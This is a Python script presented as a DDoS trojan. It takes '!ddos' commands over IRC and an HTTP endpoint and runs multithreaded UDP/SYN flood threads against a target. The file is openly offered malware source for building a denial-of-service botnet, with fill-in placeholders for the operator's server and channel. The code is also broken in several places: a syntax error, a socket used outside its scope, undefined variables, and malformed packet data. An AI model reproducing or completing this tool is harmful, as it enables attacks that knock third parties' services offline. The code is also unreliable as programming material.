import os, random, socket, struct, threading, time

# --- Configuration ---
IRC_SERVER = "irc.freenode.net"  # Replace with your IRC server
IRC_CHANNEL = "#ddos-trojan"     # Replace with your channel
HTTP_ENDPOINT = "http://192.168.1.100:3000/start" # Replace with your HTTP endpoint
PACKET_TYPES = ["UDP", "SYN"]    # Packet Types to Send
NUM_THREADS = 8                # Number of Threads to Use
TIMEOUT = 5                     # Timeout in Seconds

# --- Global Variables ---
attack_command = None  # Stores the IRC command
target_ip = None        # Stores the target IP
target_port = None      # Stores the target Port
attack_duration = 0     # Stores Attack Duration
running = True           # Running Status Flag
packet_counter = 0         # Counter for Packet Sent

# --- Functions ---
def send_packet(packet):
    """
    Sends a UDP or SYN packet to the target.
    """
    try:
        s.sendto(packet, (target_ip, target_port))
        global packet_counter
        packet_counter += 1
        print(f"Packet Sent: {packet_counter} | Type: {packet_type} | Target: {target_ip}:{target_port}")
    except socket.timeout:
        pass

# --- Synchronization Thread ---
def sync_thread():
    """
    Handles communication with the IRC server or HTTP endpoint.
    """
    global attack_command, running, target_ip, target_port, packet_type

    while running:
        try:
            if not os.path.exists("sync.lock"):
                print("Syncing to IRC...")
                sync_irc()
            else:
                print("HTTP Syncing...")
                sync_http()
            time.sleep(2)
        except Exception as e:
            print(f"Sync Error: {e}")

# --- HTTP Synchronization Function ---
def sync_http():
    """
    Handles communication via an HTTP POST request (synchronization).
    """
    try:
        if not os.path.exists("sync.lock"):
            response = requests.post(HTTP_ENDPOINT, data=data)
            if response.status_code == 200 and "start" in response.text:
                print("HTTP Sync: Attack Started")
                running = True
                global packet_type
                packet_type = random.choice(PACKET_TYPES) # Random Packet Type
            else:
                running = False
        else:
            pass # If sync.lock exists, HTTP sync is already running

    except Exception as e:
        print(f"HTTP Sync Error: {e}")
        running = False


# --- IRC Synchronization Function ---
def sync_irc():
    """
    Handles communication via an IRC command (synchronization).
    """
    global attack_command, running, target_ip, target_port

    try:
        if not os.path.exists("sync.lock"):
            # Replace with your actual IRC command
            irc_command = f"!ddos {target_ip}:{target_port} 5" # Example: !ddos 192.168.1.100:3000 5

            try:
                s.sendto(f"{irc_command}\n".encode(), (IRC_SERVER, 6667)) # Replace with your IRC Server Port
            except socket.timeout:
                pass

        else:
            print("HTTP Sync running, skipping IRC")


    except Exception as e:
        print(f"IRC Sync Error: {e}")
        running = False

# --- Flood Threads ---
def flood_thread():
    """
    Spawns multiple threads to send UDP/SYN packets.
    """
    global running, packet_counter, packet_type

    while running:
        try:
            # Generate a random packet type
            packet_type = random.choice(PACKET_TYPES)
            data = struct.pack("!i", 0) # Example data for UDP (adjust size based on your target)
            packet = f"\x45\xFC\xED\x82\xC9{data}\n".encode()

            send_packet(packet)
        except Exception as e:
            print(f"Flood Error: {e}")

# --- Main Function ---
def main():
    """
    Handles the Trojan's logic, including synchronization and flooding.
    """
    global running, target_ip, target_port, packet_counter

    # --- Socket Setup ---
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM))
        s.settimeout(TIMEOUT) # Set timeout to prevent hangs
        print("--- Trojan Started ---")

    except Exception as e:
        print(f"Socket Error: {e}")
        running = False
        exit()

    # --- Create Threads ---
    flood_threads = []
    for i in range(NUM_THREADS):
        t = threading.Thread(target=flood_thread)
        t.daemon = True  # Allow the program to exit when threads finish
        flood_threads.append(t)
        t.start()

    # --- Synchronization Thread ---
    sync_thrds = []
    sync_thrds.append(threading.Thread(target=sync_thread))
    sync_thrds[0].daemon = True
    sync_thrds[0].start()


    try:
        while running:
            time.sleep(1) # Slow down loop

    except KeyboardInterrupt:
        print("\n--- User Stopped Attack ---")
        running = False

# --- Execution ---
if __name__ == "__main__":
    import requests # Import requests here, for the HTTP endpoint

    main()
